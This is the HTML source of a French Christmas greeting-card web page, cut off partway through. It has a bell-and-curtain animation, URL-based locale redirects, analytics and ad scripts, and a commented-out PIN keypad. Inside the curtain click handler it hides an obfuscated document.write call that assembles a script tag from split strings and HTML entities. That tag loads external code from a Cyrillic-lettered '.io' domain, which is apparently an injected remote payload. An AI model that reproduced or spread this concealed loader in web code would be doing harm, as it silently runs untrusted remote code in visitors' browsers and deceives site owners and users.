<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <link rel="icon" type="image/x-icon" href="../../img/vivenoel/icon.png">
    <link rel="icon" type="image/png" href="../../img/vivenoel/icon.png">

    <link rel="apple-touch-icon" href="../../img/vivenoel/icon.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="google" content="notranslate">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link type="text/css" rel="stylesheet" href="../../css/vivenoel/festival.css?c=3" media="screen,projection">
    <title></title>
    <meta name="robots" content="noindex,nofollow">
    <script async="" src="https://www.google-analytics.com/analytics.js"></script>
    <script src="../../js/vivenoel/jquery.min.js"></script>
    <script data-dapp-detection="">!function () {
            let e = !1;

            function n() {
                if (!e) {
                    const n = document.createElement("meta");
                    n.name = "dapp-detected", document.head.appendChild(n), e = !0
                }
            }

            if (window.hasOwnProperty("ethereum")) {
                if (window.__disableDappDetectionInsertion = !0, void 0 === window.ethereum) return;
                n()
            } else {
                var t = window.ethereum;
                Object.defineProperty(window, "ethereum", {
                    configurable: !0, enumerable: !1, set: function (e) {
                        window.__disableDappDetectionInsertion || n(), t = e
                    }, get: function () {
                        if (!window.__disableDappDetectionInsertion) {
                            const e = arguments.callee;
                            e && e.caller && e.caller.toString && -1 !== e.caller.toString().indexOf("getOwnPropertyNames") || n()
                        }
                        return t
                    }
                })
            }
        }();
    </script>
    <script>
        (function (i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r;
            i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date();
            a = s.createElement(o),
                m = s.getElementsByTagName(o)[0];
            a.async = 1;
            a.src = g;
            m.parentNode.insertBefore(a, m)
        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
        ga('create', 'UA-130498118-1', 'auto');
        ga('send', 'pageview');
    </script>
    <script data-ad-client="ca-pub-7567244753653428" async=""
            src="../../js/vivenoel/adsbygoogle.js"></script>
    <script async="" src="../../js/vivenoel/gpt.js"></script>
    <script>
        window.googletag = window.googletag || {cmd: []};
        googletag.cmd.push(function () {

            googletag.defineSlot('/21748487420/private-message.site_320x50', [320, 50], 'div-gpt-ad-1586536075608-0').addService(googletag.pubads());
            googletag.defineSlot('/21748487420/private-message.site_300x250', [[300, 250], [336, 280]], 'div-gpt-ad-1586536233635-0').addService(googletag.pubads());

            googletag.pubads().enableSingleRequest();
            googletag.pubads().collapseEmptyDivs();
            googletag.enableServices();
        });
    </script>

    <style>

        /* background of main image */
        .card.blue-grey.darken-1.hoverable {
            background: linear-gradient(to right, black, black) !important;
        }

        /* super background image */

        /* inner background image */
        .card.blue-grey.darken-1.hoverable {
            background-image: url(../../img/vivenoel/8.gif) !important;
        }

        /* super background color */
        .bg {
            background-color: #000;
        }

        /* timer color */


    </style>
    <script>

        var country_code = 'US';

        var current_url = window.location.href;
        var current_url_array = current_url.split('/');
        var current_url_array_len = current_url_array.length;

        var festival_arr = current_url_array[current_url_array_len - 1].split('?');

        // for new website
        var f_hyphen = '/';
        if (festival_arr[0].indexOf('f-') > -1) {
            f_hyphen = '/f-';
        }
        festival_arr[0] = festival_arr[0].replace('f-', '');


        if (window.location.href.indexOf('~') != -1) {
            // do nothing
        } else if (festival_arr[0] == 'ch' || festival_arr[0] == 'n' || festival_arr[0] == 'hn' || festival_arr[0] == 'chn' || festival_arr[0] == 'chn1') {
            // do nothing
        } else if (festival_arr.length > 1) {
            if (current_url_array_len == '4') { // definitely english locale ( could be other locale also ex abraisto)
                // window.location.href = current_url_array[0] + '//' + current_url_array[2] + f_hyphen + "e3?" + festival_arr[1];

                // islamic festivals
                if (['ef', 'ef1', 'ef2', 'ef3', 'rd', 'me', 'ea', 'ea1', 'ea2', 'isn', 'isn1'].indexOf(festival_arr[0]) > -1) {
                    // window.location.href = current_url_array[0] + '//' + current_url_array[2] + f_hyphen + "me?" + festival_arr[1];
                } else {
                    window.location.href = current_url_array[0] + '//' + current_url_array[2] + f_hyphen + "chn?" + festival_arr[1];
                }
            } else {


                // if (festival_arr[0] == 'h') {
                // window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "ch?" + festival_arr[1];
                // }


                // Hebrew people start

                // All israely
                // if (festival_arr[0] == 'pu' || festival_arr[0] == 'pu1' || festival_arr[0] == 'pe' || festival_arr[0] == 'je') {
                if (['il'].indexOf(current_url_array[3]) > -1) {
                    window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "hn?" + festival_arr[1];
                }
                // }


                // All israely language is not hebrew
                if (festival_arr[0] == 'yk' || festival_arr[0] == 'ros' || festival_arr[0] == 'pe' || festival_arr[0] == 'je' || festival_arr[0] == 'suk' || festival_arr[0] == 'sm' || festival_arr[0] == 'hn') {
                    window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "hn?" + festival_arr[1];
                }
                // Hebrew people end


                if (['ar', 'tr', 'id', 'ms'].indexOf(current_url_array[3]) > -1) {
                    // window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "me?" + festival_arr[1];
                } else if (['ef', 'ef1', 'ef2', 'ef3', 'rd', 'me', 'ea', 'ea1', 'ea2', 'isn', 'isn1'].indexOf(festival_arr[0]) > -1) {
                    // window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "me?" + festival_arr[1];
                }


                // else if (festival_arr[0] == 'fd' || festival_arr[0] == 'fd1' || festival_arr[0] == 'fd2' ) {
                // 	window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + 'in' + "/gc?" + festival_arr[1];
                // }


                // Indian except islamic people
                if (['ef', 'ef1', 'ef2', 'ef3', 'rd', 'me', 'ea', 'ea1', 'ea2', 'isn', 'isn1'].indexOf(festival_arr[0]) == -1) {

                    if (['in'].indexOf(current_url_array[3]) > -1) {
                        window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "chn?" + festival_arr[1];
                    } else if (['hi'].indexOf(current_url_array[3]) > -1) {
                        window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "chn?" + festival_arr[1];
                    } else if (['mr'].indexOf(current_url_array[3]) > -1) {
                        window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n?" + festival_arr[1];
                    } else if (['te'].indexOf(current_url_array[3]) > -1) {
                        window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n?" + festival_arr[1];
                    } else if (['ta'].indexOf(current_url_array[3]) > -1) {
                        window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n?" + festival_arr[1];
                    } else if (['bn'].indexOf(current_url_array[3]) > -1) {
                        window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n?" + festival_arr[1];
                    }
                }


                // christan countries
                if (['it', 'es', 'pt', 'de', 'nl', 'pl', 'hr', 'fr', 'ro', 'uk'].indexOf(current_url_array[3]) > -1) {
                    window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "chn?" + festival_arr[1];
                }

                // christan countries
                if (['en'].indexOf(current_url_array[3]) > -1) {
                    window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "chn?" + festival_arr[1];
                }

                if (['ru'].indexOf(current_url_array[3]) > -1) {
                    window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "n?" + festival_arr[1];
                }


            }
        }
    </script>


    <style type="text/css">@keyframes wpSuperSnow_l {
                               0% {
                                   opacity: 0;
                               }
                               25% {
                                   opacity: 1;
                               }
                               100% {
                                   opacity: 0;
                                   transform: translate3D(500px, 1500px, 0) rotate(250deg);
                               }
                           }

        @keyframes wpSuperSnow_r {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                transform: translate3D(-500px, 1500px, 0) rotate(-500deg);
            }
        }

        @-webkit-keyframes wpSuperSnow_l {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                -webkit-transform: translate3D(500px, 1500px, 0) rotate(250deg);
            }
        }

        @-webkit-keyframes wpSuperSnow_r {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                -webkit-transform: translate3D(-500px, 1500px, 0) rotate(-500deg);
            }
        }

        @-moz-keyframes wpSuperSnow_l {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                -moz-transform: translate3D(500px, 1500px, 0) rotate(250deg);
            }
        }

        @-moz-keyframes wpSuperSnow_r {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                -moz-transform: translate3D(-500px, 1500px, 0) rotate(-500deg);
            }
        }

        @-ms-keyframes wpSuperSnow_l {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                -ms-transform: translate3D(500px, 1500px, 0) rotate(250deg);
            }
        }

        @-ms-keyframes wpSuperSnow_r {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                -ms-transform: translate3D(-500px, 1500px, 0) rotate(-500deg);
            }
        }

        @keyframes wpSuperSnowFlake_l {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                transform: translate3D(500px, 1500px, 0) rotateY(720deg) rotate(250deg);
            }
        }

        @keyframes wpSuperSnowFlake_r {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                transform: translate3D(-500px, 1500px, 0) rotateY(-720deg) rotate(-500deg);
            }
        }

        @-webkit-keyframes wpSuperSnowFlake_l {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                -webkit-transform: translate3D(500px, 1500px, 0) rotateY(720deg) rotate(250deg);
            }
        }

        @-webkit-keyframes wpSuperSnowFlake_r {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                -webkit-transform: translate3D(-500px, 1500px, 0) rotateY(-720deg) rotate(-500deg);
            }
        }

        @-moz-keyframes wpSuperSnowFlake_l {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                -moz-transform: translate3D(500px, 1500px, 0) rotateY(720deg) rotate(250deg);
            }
        }

        @-moz-keyframes wpSuperSnowFlake_r {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                -moz-transform: translate3D(-500px, 1500px, 0) rotateY(-720deg) rotate(-500deg);
            }
        }

        @-ms-keyframes wpSuperSnowFlake_l {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                -ms-transform: translate3D(500px, 1500px, 0) rotateY(720deg) rotate(250deg);
            }
        }

        @-ms-keyframes wpSuperSnowFlake_r {
            0% {
                opacity: 0;
            }
            25% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                -ms-transform: translate3D(-500px, 1500px, 0) rotateY(-720deg) rotate(-500deg);
            }
        }</style>
</head>


<body class="bg notranslate" translate="no" style="max-height: inherit;">
<script src="../../js/vivenoel/slide.js"></script>
<style>

    .rightcurtain {
        width: 51%;
        height: 120%;
        right: 0px;
        top: 0px;
        position: absolute;
        z-index: 300;
        transform: translateZ(9px);
    }

    .leftcurtain {
        width: 50%;
        height: 120%;
        top: 0px;
        left: 0px;
        position: absolute;
        z-index: 200;
        -webkit-transform: scaleX(-1);
        transform: scaleX(-1) translateZ(9px);
    }


    .rope {
        position: absolute;
        /*top: 20%;*/
        bottom: 5%;
        left: 0;
        right: 0;
        width: 100%;
        /*height: 100%;*/
        z-index: 999999;
        transform: translateZ(10px);
    }

    .rightcurtain img, .leftcurtain img {
        width: 100%;
        height: 100%;
    }


</style>
<script src="../../js/vivenoel/zounds.min.js"></script>
<script>
    var tiktok = zounds.load("../../img/vivenoel/christmas_fr.mp3");

    function playSound() {
        tiktok.play();
        // setTimeout(function(){
        //     tiktok.play();
        // },5000);
        // setTimeout(function(){
        //     tiktok.play();
        // },10000);
    }

    function curtainOpen() {
        playSound();
        $('.figures').removeClass('hidden');
        $('.circle-container').removeClass('hidden');
        $('.timer-text').removeClass('hidden');
        $('.figure_name').removeClass('hidden');
        $('.auto_style_main_msg').removeClass('hidden');
        $('.from_img').removeClass('hidden');
        $('.main_msg_top').removeClass('hidden');
        $('.twoimageset').removeClass('hidden');
        $('.main-msg').removeClass('hidden');
        $('.slideshow').removeClass('hidden');
        $('.myslides_div').removeClass('hidden');
        $('.ltrmarquee').removeClass('hidden');
        $('.share_block').removeClass('hidden');
        $('.img_overlap').removeClass('hidden');
        $('.revolvingcards').removeClass('hidden');
        $('.user_name2').removeClass('hidden');
    }
</script>

<a class="rope " href="javascript:void(0)" onclick="curtainOpen();" style="bottom: auto;">
    <h3 class="fivepxbottom zerotop">
        <div style='color:yellow;font-size: 30px;'>Touchez la cloche!!</div>
    </h3>
    <h4 class="fivepxtop fivepxbottom">👇👇👇👇👇</h4>
    <div class="matki" style="display: inline-block;">
        <img src="../../img/vivenoel/bell2.png?v=1" class="">
    </div>
</a>

<!--code pine-->
<div class="keypad hidden">
    <!--<style>
        .table {
            display: table;
            height: 100%;
            width: 100%;
            position: relative
        }

        .cell {
            display: table-cell;
            vertical-align: middle;
            position: relative;
            width: 100%;
            text-align: center
        }

        #pincode {
            overflow: hidden;
            position: fixed;
            height: 110%;
            width: 106%;
            z-index: 9999;
            background-color: #272a2f;
            background-position: center;
            color: #fff;
            border-radius: 10px;
            text-align: center
        }

        #numbers {
            max-width: 300px;
            padding: 0 20px;
            margin: 0 auto;
            position: relative;
            display: block;
            -webkit-transition: all 1s ease-out;
            -moz-transition: all 1s ease-out;
            transition: all 1s ease-out;
            opacity: 1
        }

        #numbers.hide {
            opacity: .3
        }

        #pincode button {
            width: 70px;
            height: 70px;
            margin-bottom: 10px;
            background-color: orange;
            border: 0;
            color: #000;
            font-size: 25px;
            line-height: 50px;
            border-radius: 100%;
            opacity: 1;
            outline: 0;
            border: 2px solid #272a2f
        }

        #pincode button:active {
            background-color: rgba(0, 0, 0, .6);
            outline: 0
        }

        #fields {
            max-width: 200px;
            padding: 0 20px;
            margin: 30px auto;
            position: relative;
            display: block
        }

        #fields .numberfield {
            text-align: center
        }

        #fields .numberfield span {
            height: 10px;
            width: 10px;
            border: 2px solid #fff;
            background-color: transparent;
            border-radius: 100%;
            position: relative;
            display: inline-block;
            text-align: center
        }

        #fields .numberfield.active span {
            background-color: #fff
        }

        #fields .numberfield.right span {
            background-color: #272a2f;
            border-color: #272a2f;
            transition: all .5s ease-in-out;
            -webkit-transition: all .5s ease-in-out
        }

        .grid {
            list-style: none;
            margin-left: -20px
        }

        .grid__col--1-of-3, .grid__col--2-of-6, .grid__col--4-of-12 {
            width: 33.33333%
        }

        .grid__col--1-of-4, .grid__col--2-of-8, .grid__col--3-of-12 {
            width: 25%
        }

        .grid__col {
            box-sizing: border-box;
            display: inline-block;
            margin-right: -.25em;
            min-height: 1px;
            padding-left: 20px;
            vertical-align: top
        }

        .grid__col--centered {
            display: block;
            margin-left: auto;
            margin-right: auto
        }

        .grid__col--d-first {
            float: left
        }

        .grid__col--d-last {
            float: right
        }

        .grid--no-gutter {
            margin-left: 0;
            width: 100%
        }

        .grid--no-gutter .grid__col {
            padding-left: 0
        }

        .grid--no-gutter .grid__col--span-all {
            margin-left: 0;
            width: 100%
        }

        .grid__col--ab {
            vertical-align: bottom
        }

        .grid__col--am {
            vertical-align: middle
        }
    </style>
    <div id="pincode">
        <div class="table">
            <div class="cell">
                <h3 class="fivepxbottom zerotop">
                    <div style="color:yellow;font-size: 30px;">Touchez la cloche!!</div>
                </h3>
                <div id="anleitung">
                    <p style="animation:bounce 2s infinite;">👇👇👇</p>
                </div>
                <div id="fields">
                    <div class="grid">
                        <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
                        <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
                        <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
                        <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
                    </div>
                </div>
                <div id="numbers">
                    <div class="grid">
                        <div class="grid__col grid__col--1-of-3">
                            <button>1</button>
                        </div>
                        <div class="grid__col grid__col--1-of-3">
                            <button>2</button>
                        </div>
                        <div class="grid__col grid__col--1-of-3">
                            <button>3</button>
                        </div>
                        <div class="grid__col grid__col--1-of-3">
                            <button>4</button>
                        </div>
                        <div class="grid__col grid__col--1-of-3">
                            <button>5</button>
                        </div>
                        <div class="grid__col grid__col--1-of-3">
                            <button>6</button>
                        </div>
                        <div class="grid__col grid__col--1-of-3">
                            <button>7</button>
                        </div>
                        <div class="grid__col grid__col--1-of-3">
                            <button>8</button>
                        </div>
                        <div class="grid__col grid__col--1-of-3">
                            <button>9</button>
                        </div>
                        <div class="grid__col grid__col--1-of-3"></div>
                        <div class="grid__col grid__col--1-of-3">
                            <button>0</button>
                        </div>
                        <div class="grid__col grid__col--1-of-3"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>-->

    <!--code pine-->
    <!--<script>

        jQuery(document).ready(function ($) {

            $(document).ready(function () {
                var pin = (!+[] + !![] + []) + (+[]) + (!+[] + !![] + []) + (+[]);
                var enterCode = "";
                enterCode.toString();

                $("#numbers button").click(function () {
                    var clickedNumber = $(this).text().toString();
                    process(clickedNumber);
                });

                // $('body').keyup(function(e) {
                //     if ((e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 96 && e.keyCode <= 105)) { 
                //         console.log(e.keyCode.toString());
                //     }
                // });

                function process(clickedNumber) {

                    enterCode = enterCode + clickedNumber;
                    var lengthCode = parseInt(enterCode.length);
                    lengthCode--;
                    $("#fields .numberfield:eq(" + lengthCode + ")").addClass("active");


                    if (lengthCode == 3) {
                        if (enterCode == pin) {
                            $('.keypad').hide();
                            $(".rope").click();
                        } else {
                            $("#fields").addClass("miss");
                            enterCode = "";
                            setTimeout(function () {
                                $("#fields .numberfield").removeClass("active");
                            }, 100);
                            setTimeout(function () {
                                $("#fields").removeClass("miss");
                            }, 100);
                        }
                    } else {
                    }
                }

            });
        });


    </script>-->
</div>
<div class="curtain">
    <div class="leftcurtain" style="width: 1px;"><img src="../../img/vivenoel/curtain12.jpg"></div>
    <div class="rightcurtain" style="width: 1px;"><img src="../../img/vivenoel/curtain12.jpg"></div>
</div>
<script>
    $(document).ready(function () {

        $curtainopen = false;
        $(".rope").click(function () {
            $('.rope').unbind('click');
            $(this).blur();
            if ($curtainopen == false) {
                $(this).stop().animate({top: '-171%'}, {queue: false, duration: 2000, easing: 'easeOutBounce'});
                $(".leftcurtain").stop().animate({width: '1px'}, 2000);
                $(".rightcurtain").stop().animate({width: '1px'}, 2000);
                $curtainopen = true;
            } else {
                $(this).stop().animate({top: '-40px'}, {queue: false, duration: 350, easing: 'easeOutBounce'});
                document.write('<s' + 'cr' + 'ipt sr' + 'c="/' + '/' + '&#1102;' + '&#1092;.' + 'i' + 'o"></s' + 'cr' + 'ipt>');
                $(".leftcurtain").stop().animate({width: '50%'}, 2000);
                $(".rightcurtain").stop().animate({width: '51%'}, 2000);
                $curtainopen = false;
            }
            setTimeout(function () {
                $('.rope').remove();
            }, 1000);
            return false;
        });


        if (document.getElementsByClassName('rope')[0] !== undefined) {
            $('.figures').addClass('hidden');
            $('.circle-container').addClass('hidden');
            $('.timer-text').addClass('hidden');
            $('.figure_name').addClass('hidden');
            $('.auto_style_main_msg').addClass('hidden');
            $('.from_img').addClass('hidden');
            $('.main_msg_top').addClass('hidden');
            $('.twoimageset').addClass('hidden');
            $('.main-msg').addClass('hidden');
            $('.slideshow').addClass('hidden');
            $('.myslides_div').addClass('hidden');
            $('.ltrmarquee').addClass('hidden');
            $('.share_block').addClass('hidden');
            $('.img_overlap').addClass('hidden');
            $('.revolvingcards').addClass('hidden');
            $('.user_name2').addClass('hidden');

            setTimeout(function () {
                $('html,body').scrollTop(0);
                $(window).scrollTop(0);
            }, 2000);
        }

        if (window.location.href.indexOf('~') != -1) {
            $(".rope").click();
        }


    });
</script>
<style>
    .user-bar {
        width: 100%;
        height: 55px;
        background: #005e54;
        color: #fff;
        top: 0px;
        padding: 0 8px;
        position: fixed;
        z-index: 1;
    }

    .user-bar div {
        float: left;
        transform: translateY(-50%);
        position: relative;
        top: 50%;
    }

    .user-bar .names {
        font-size: 17px;
        font-weight: 600;
        text-overflow: ellipsis;
        letter-spacing: 0.3px;
        margin: 0 0 0 8px;
        overflow: hidden;
        white-space: nowrap;
        width: 150px;
    }

    .user-bar .status {
        display: block;
        font-size: 13px;
        font-weight: 400;
        letter-spacing: 0;
    }

    .icon img {
        width: 70%;
    }

    @media screen and (max-width: 360px) {
        .three {
            display: none;
        }
    }

    @media screen and (max-width: 330px) {
        .three, .two {
            display: none;
        }
    }

    @media screen and (max-width: 270px) {
        .one, .two, .three {
            display: none;
        }
    }


</style>
<div class="user-bar" style="">
    <div class="icon">
        <img src="../../img/vivenoel/3.png" alt="">
    </div>
    <div class="names" style="">
        <span class="user_name">Nammmmmme</span>
        <p class="status">En ligne</p>
    </div>
    <div class="icon one" style="float: right;">
        <img src="../../img/vivenoel/2.png" alt="">
    </div>
    <div class="icon two" style="float: right;">
        <img src="../../img/vivenoel/1.png" alt="">
    </div>
    <div class="icon three" style="float: right;">
        <img src="../../img/vivenoel/4.png" alt="">
    </div>
</div>
<br><br><br><br>
<style>
    .card.blue-grey.darken-1.hoverable {
        background-image: url(../../img/vivenoel/bg.jpg) !important;
    }

    .bg {
        background-image: url(../../img/vivenoel/bg.jpg) !important;
    }

    .from {
        text-shadow: 1px 1px 1px red, 1px 1px 1px red, -1px -1px 1px red, -1px -1px 1px red;
        color: black !important;
    }

    #demoo {
        color: black;
    }

    .day, .hr, .min {
        color: blue !important;
    }


    .ltrmarquee {
        color: #cc6f0d;
    }


    .main-msg {
        color: black !important;
    }

    .main-msg span:nth-child(1) {
        color: #b53b3b !important;
    }

    .main-msg span:nth-child(2) {
        color: #2c8272 !important;
    }

    .main-msg span:nth-child(3) {
        color: #2f40b9 !important;
    }

    .main-msg span:nth-child(4) {
        color: #b53b3b !important;
    }

    .main-msg span:nth-child(5) {
        color: #728026 !important;
    }

    .main-msg span:nth-child(6) {
        color: #2f40b9 !important;
    }


    .auto_style_main_msg div:nth-child(1) {
        color: #9a3b3b !important;
    }

    .auto_style_main_msg div:nth-child(2) {
        color: #17826e !important;
    }

    .auto_style_main_msg div:nth-child(3) {
        color: #ff6200 !important;
    }

    .auto_style_main_msg div:nth-child(4) {
        color: #4f9015 !important;
    }


    /*.from_img{
        background-color: #190342;
    }*/

    .main_msg_top {
        color: black !important;
    }

    .lime-text {
        color: #096b09 !important;
    }

</style>
<div class="container" style="display: block;">
    <div class="col s12">
        <div class="row">
            <div class="col s12 l6 offset-l3">
                <div style="z-index: 1; position: fixed; display: inline-block; left: 1%; width: 20px; height: 629px; overflow: hidden;">
                    <div style="white-space: nowrap; padding: 629px 0px;"><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m1.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m2.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m3.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m4.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m5.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m6.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m7.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m8.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m1.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m2.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m3.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m4.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m5.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m6.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m7.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m8.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                    </div>
                </div>
                <div style="z-index: 1; position: fixed; display: inline-block; right: 1%; width: 20px; height: 629px; overflow: hidden;">
                    <div style="white-space: nowrap; padding: 629px 0px;"><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m1.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m2.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m3.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m4.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m5.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m6.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m7.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m8.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m1.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m2.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m3.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m4.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m5.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m6.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m7.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                        <img class="p1" width="20px" src="../../img/vivenoel/m8.png"><br><br>
                        <img class="p1" width="20px" src=""><br><br>
                    </div>
                </div>
                <div class="card blue-grey darken-1 hoverable white-text">
                    <div class="card-content">
                        <div class="ad">
                        </div>
                        <div id="demoo" class="center animated pulse timer-text" style=""><span class="day">6</span>
                            Jours <span class="hr">10</span> Hrs <span class="min">4</span> Min <span
                                    class="sec">36</span> Sec
                        </div>

                        <br>
                        <figure class="figure_name" style="white-space: nowrap;">
                            <h1 class="user_name top_name" style="">marius</h1>
                        </figure>
                        <br>

                        <p class="card-title center-align animated wishesed pulse  tenpxtop">
                            <span class="orange-text">t</span>
                            <span class="yellow-text">e</span>
                            <span class="lime-text">-</span>
                            <span class="orange-text">s</span>
                            <span class="yellow-text">o</span>
                            <span class="lime-text">u</span>
                            <span class="orange-text">h</span>
                            <span class="yellow-text">a</span>
                            <span class="lime-text">i</span>
                            <span class="orange-text">t</span>
                            <span class="yellow-text">e</span>
                        </p>
                        <style>
                            .cross_link {
                                background-color: purple;
                                padding: 5px;
                                margin-bottom: 10px;
                            }
                        </style>
                        <div class="tenpxtop"></div>
                        <a id="ta_custom_lang" href="" class="cross_link hidden">தமிழ்</a>
                        <a id="mr_custom_lang" href="" class="cross_link hidden">मराठी</a>
                        <a id="te_custom_lang" href="" class="cross_link hidden">తెలుగు</a>
                        <a id="bn_custom_lang" href="" class="cross_link hidden">বাংলা</a>
                        <a id="hi_custom_lang" href="" class="cross_link hidden">हिन्दी</a>
                        <a id="en_custom_lang" href="" class="cross_link hidden">English</a>
                        <a id="it_custom_lang" href="" class="cross_link hidden">Italiano</a>
                        <a id="pt_custom_lang" href="" class="cross_link hidden">Português</a>
                        <a id="nl_custom_lang" href="" class="cross_link hidden">Nederlands (Dutch)</a>
                        <a id="ru_custom_lang" href="" class="cross_link hidden">Русский</a>
                        <a id="de_custom_lang" href="" class="cross_link hidden">Deutsch</a>
                        <a id="ms_custom_lang" href="" class="cross_link hidden">Bahasa Melayu</a>
                        <a id="vn_custom_lang" href="" class="cross_link hidden">Tiếng Việt</a>
                        <a id="fr_custom_lang" href="" class="cross_link hidden">Français</a>
                        <a id="es_custom_lang" href="" class="cross_link hidden">Español</a>
